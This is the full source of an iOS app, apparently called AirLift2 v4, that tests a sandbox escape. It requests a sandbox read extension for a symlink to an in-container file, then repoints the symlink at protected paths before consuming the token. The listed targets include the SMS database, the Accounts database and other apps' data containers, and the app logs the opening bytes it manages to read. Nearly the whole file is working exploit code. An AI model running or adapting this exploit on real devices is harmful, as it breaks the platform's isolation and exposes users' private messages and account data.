// AirLift2 v4 - sandbox_extension issue/consume TOCTOU (no NOFOLLOW)
// v4 重点：每个目标都做「不走逃逸」与「走逃逸」的并列对照，避免把本来就可读的文件误判成逃逸成功。

#import <UIKit/UIKit.h>
#import <Foundation/Foundation.h>
#include <dirent.h>
#include <dlfcn.h>
#include <errno.h>
#include <fcntl.h>
#include <stdarg.h>
#include <stdlib.h>
#include <string.h>
#include <sys/stat.h>
#include <unistd.h>

typedef char *(*issue_fn)(const char *, const char *, uint64_t);
typedef int64_t (*consume_fn)(const char *);
typedef void (*release_fn)(int64_t);

static issue_fn p_issue;
static consume_fn p_consume;
static release_fn p_release;

static NSString *gLink;
static NSString *gAnchor;
static NSMutableString *gLog;
static UITextView *gTV;
static NSString *gLogPath;

static void flushTV(void) {
    if (!gTV) return;
    gTV.text = gLog;
    if (gLog.length > 1)
        [gTV scrollRangeToVisible:NSMakeRange(gLog.length - 1, 1)];
}

static void L(NSString *fmt, ...) {
    va_list ap;
    va_start(ap, fmt);
    NSString *s = [[NSString alloc] initWithFormat:fmt arguments:ap];
    va_end(ap);
    NSLog(@"[airlift2] %@", s);
    dispatch_async(dispatch_get_main_queue(), ^{
        [gLog appendString:s];
        [gLog appendString:@"\n"];
        flushTV();
    });
}

static void setupOnce(void) {
    static dispatch_once_t once;
    dispatch_once(&once, ^{
        NSString *tmp = NSTemporaryDirectory();
        gLink = [tmp stringByAppendingPathComponent:@"l"];
        gAnchor = [tmp stringByAppendingPathComponent:@"s"];
        [@"anchor" writeToFile:gAnchor atomically:YES
                      encoding:NSUTF8StringEncoding error:nil];
        gLog = [NSMutableString string];
        NSString *docs = [NSSearchPathForDirectoriesInDomains(NSDocumentDirectory, NSUserDomainMask, YES) firstObject];
        gLogPath = [docs stringByAppendingPathComponent:@"airlift2.log"];
    });
}

static void saveLog(void) {
    [gLog writeToFile:gLogPath atomically:YES encoding:NSUTF8StringEncoding error:nil];
}

static void resolveSymbols(void) {
    void *h = dlopen("/usr/lib/system/libsystem_sandbox.dylib", RTLD_NOW);
    if (!h) h = dlopen(NULL, RTLD_NOW);
    p_issue = (issue_fn)dlsym(h, "sandbox_extension_issue_file");
    p_consume = (consume_fn)dlsym(h, "sandbox_extension_consume");
    p_release = (release_fn)dlsym(h, "sandbox_extension_release");
    L(@"symbols: issue=%s consume=%s release=%s",
      p_issue ? "ok" : "NULL", p_consume ? "ok" : "NULL", p_release ? "ok" : "NULL");
}

// 用容器内 anchor 签发扩展，返回 token（NULL 表示签发失败）
static char *issueThroughAnchor(void) {
    if (!p_issue) return NULL;
    unlink(gLink.fileSystemRepresentation);
    if (symlink(gAnchor.fileSystemRepresentation, gLink.fileSystemRepresentation) != 0)
        return NULL;
    char *tok = p_issue("com.apple.app-sandbox.read", gLink.fileSystemRepresentation, 0);
    if (!tok)
        L(@"    issue_file=NULL errno=%s", strerror(errno));
    return tok;
}

static void repoint(const char *target) {
    unlink(gLink.fileSystemRepresentation);
    symlink(target, gLink.fileSystemRepresentation);
}

// 直接 open 读，返回可读性与 errno
static void probeRaw(NSString *path) {
    errno = 0;
    int fd = open(path.fileSystemRepresentation, O_RDONLY);
    if (fd < 0) {
        L(@"    DENIED   %s", strerror(errno));
        return;
    }
    char buf[128] = {0};
    ssize_t n = read(fd, buf, sizeof(buf) - 1);
    close(fd);
    NSString *head = [[NSString alloc] initWithBytes:buf length:(n > 0 ? n : 0)
                                             encoding:NSUTF8StringEncoding];
    head = [[head ?: @"(binary)" stringByReplacingOccurrencesOfString:@"\n" withString:@" | "]
            stringByReplacingOccurrencesOfString:@"\r" withString:@" "];
    L(@"    READABLE %zd bytes  %@", n, [head substringToIndex:MIN((NSUInteger)60, head.length)]);
}

// 走逃逸后再 open 读
static void probeEscaped(NSString *path) {
    char *tok = issueThroughAnchor();
    if (!tok) return;
    repoint(path.fileSystemRepresentation);
    errno = 0;
    int64_t h = p_consume ? p_consume(tok) : -1;
    L(@"    consume=%lld", (long long)h);
    free(tok);
    errno = 0;
    int fd = open(gLink.fileSystemRepresentation, O_RDONLY);
    if (fd < 0) {
        L(@"    DENIED   %s", strerror(errno));
    } else {
        char buf[128] = {0};
        ssize_t n = read(fd, buf, sizeof(buf) - 1);
        close(fd);
        NSString *head = [[NSString alloc] initWithBytes:buf length:(n > 0 ? n : 0)
                                                 encoding:NSUTF8StringEncoding];
        head = [[head ?: @"(binary)" stringByReplacingOccurrencesOfString:@"\n" withString:@" | "]
                stringByReplacingOccurrencesOfString:@"\r" withString:@" "];
        L(@"    READABLE %zd bytes  %@", n, [head substringToIndex:MIN((NSUInteger)60, head.length)]);
    }
    if (h > 0 && p_release) p_release(h);
}

static void probeDir(NSString *path) {
    errno = 0;
    DIR *d = opendir(path.fileSystemRepresentation);
    if (d) {
        int n = 0;
        struct dirent *e;
        while ((e = readdir(d))) { if (e->d_name[0] != '.') n++; }
        closedir(d);
        L(@"    dir plain: OK %d entries", n);
    } else {
        L(@"    dir plain: DENIED %s", strerror(errno));
    }

    char *tok = issueThroughAnchor();
    if (!tok) return;
    repoint(path.fileSystemRepresentation);
    int64_t h = p_consume ? p_consume(tok) : -1;
    errno = 0;
    d = opendir(gLink.fileSystemRepresentation);
    if (d) {
        int n = 0;
        struct dirent *e;
        while ((e = readdir(d))) { if (e->d_name[0] != '.') n++; }
        closedir(d);
        L(@"    dir esc  : OK %d entries", n);
    } else {
        L(@"    dir esc  : DENIED %s", strerror(errno));
    }
    free(tok);
    if (h > 0 && p_release) p_release(h);
}

static void runChecks(void) {
    @autoreleasepool {
        setupOnce();
        UIDevice *dev = [UIDevice currentDevice];
        L(@"=== sandbox_extension TOCTOU (build v4) ===");
        L(@"%@ / iOS %@ / uid=%d", dev.model, dev.systemVersion, getuid());
        resolveSymbols();
        if (!p_issue || !p_consume) { L(@"符号缺失"); saveLog(); return; }

        NSArray *files = @[
            @"/etc/passwd",                                                        // 对照：本来就可读
            @"/var/mobile/Library/Preferences/.GlobalPreferences.plist",           // v3 里读到过
            @"/var/mobile/Library/SMS/sms.db",                                     // 预期被拦
            @"/var/mobile/Library/Preferences/com.apple.springboard.plist",        // 预期被拦
            @"/private/var/mobile/Library/Accounts/Accounts3.sqlite",              // 预期被拦
        ];
        int idx = 1;
        for (NSString *p in files) {
            L(@"[%d] %@", idx++, p);
            L(@"  plain:");
            probeRaw(p);
            L(@"  escaped:");
            probeEscaped(p);
        }

        L(@"[dir] /var/mobile/Containers/Data/Application");
        probeDir(@"/var/mobile/Containers/Data/Application");

        L(@"[dir] /var/mobile/Library/SMS");
        probeDir(@"/var/mobile/Library/SMS");

        L(@"=== done ===");
        saveLog();
    }
}

@interface AppDelegate : UIResponder <UIApplicationDelegate>
@property (nonatomic, strong) UIWindow *window;
@property (nonatomic, strong) UITextView *tv;
@end

@implementation AppDelegate

- (void)startRun {
    dispatch_async(dispatch_get_global_queue(QOS_CLASS_USER_INITIATED, 0), ^{
        @try { runChecks(); }
        @catch (NSException *e) { L(@"EXCEPTION: %@ - %@", e.name, e.reason); }
    });
}

- (BOOL)application:(UIApplication *)app didFinishLaunchingWithOptions:(NSDictionary *)opts {
    setupOnce();
    self.window = [[UIWindow alloc] initWithFrame:[UIScreen mainScreen].bounds];
    UIViewController *vc = [UIViewController new];
    vc.view.backgroundColor = [UIColor blackColor];

    self.tv = [[UITextView alloc] initWithFrame:CGRectZero];
    self.tv.editable = NO;
    self.tv.textColor = [UIColor greenColor];
    self.tv.backgroundColor = [UIColor blackColor];
    self.tv.font = [UIFont monospacedSystemFontOfSize:10 weight:UIFontWeightRegular];
    self.tv.translatesAutoresizingMaskIntoConstraints = NO;
    self.tv.text = @"airlift2 v4\nbooting...\n";
    gTV = self.tv;
    [@"launch" writeToFile:gLogPath atomically:YES encoding:NSUTF8StringEncoding error:nil];

    UIButton *btn = [UIButton buttonWithType:UIButtonTypeSystem];
    [btn setTitle:@"RUN" forState:UIControlStateNormal];
    [btn setTitleColor:[UIColor greenColor] forState:UIControlStateNormal];
    [btn addTarget:self action:@selector(run) forControlEvents:UIControlEventTouchUpInside];
    btn.translatesAutoresizingMaskIntoConstraints = NO;
    btn.titleLabel.font = [UIFont monospacedSystemFontOfSize:20 weight:UIFontWeightBold];

    UIButton *copy = [UIButton buttonWithType:UIButtonTypeSystem];
    [copy setTitle:@"COPY" forState:UIControlStateNormal];
    [copy setTitleColor:[UIColor cyanColor] forState:UIControlStateNormal];
    [copy addTarget:self action:@selector(copyLog) forControlEvents:UIControlEventTouchUpInside];
    copy.translatesAutoresizingMaskIntoConstraints = NO;

    [vc.view addSubview:self.tv];
    [vc.view addSubview:btn];
    [vc.view addSubview:copy];
    [NSLayoutConstraint activateConstraints:@[
        [self.tv.topAnchor constraintEqualToAnchor:vc.view.safeAreaLayoutGuide.topAnchor],
        [self.tv.leadingAnchor constraintEqualToAnchor:vc.view.leadingAnchor constant:8],
        [self.tv.trailingAnchor constraintEqualToAnchor:vc.view.trailingAnchor constant:-8],
        [self.tv.bottomAnchor constraintEqualToAnchor:btn.topAnchor constant:-8],
        [btn.centerXAnchor constraintEqualToAnchor:vc.view.centerXAnchor constant:-50],
        [btn.bottomAnchor constraintEqualToAnchor:vc.view.safeAreaLayoutGuide.bottomAnchor constant:-10],
        [copy.centerYAnchor constraintEqualToAnchor:btn.centerYAnchor],
        [copy.leadingAnchor constraintEqualToAnchor:btn.trailingAnchor constant:30],
    ]];

    self.window.rootViewController = vc;
    [self.window makeKeyAndVisible];
    [self startRun];
    return YES;
}

- (void)run {
    [gLog setString:@""];
    flushTV();
    [self startRun];
}

- (void)copyLog {
    [UIPasteboard generalPasteboard].string = gLog ?: @"";
}

@end

int main(int argc, char *argv[]) {
    @autoreleasepool {
        return UIApplicationMain(argc, argv, nil, NSStringFromClass([AppDelegate class]));
    }
}
